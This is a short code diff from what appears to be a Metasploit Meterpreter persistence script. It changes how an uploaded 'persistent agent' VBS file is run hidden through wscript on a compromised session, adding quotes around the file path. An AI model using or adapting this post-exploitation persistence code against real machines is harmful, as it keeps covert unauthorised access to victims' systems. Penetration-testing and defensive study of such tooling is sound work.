@@ -79,7 +79,7 @@ print_status("Uploaded the persistent agent to #{tempvbs}")
 #
 # Execute the agent
 #
-proc = session.sys.process.execute("wscript #{tempvbs}", nil, {'Hidden' => true})
+proc = session.sys.process.execute("wscript \"#{tempvbs}\"", nil, {'Hidden' => true})
 print_status("Agent executed with PID #{proc.pid}")
 
 #
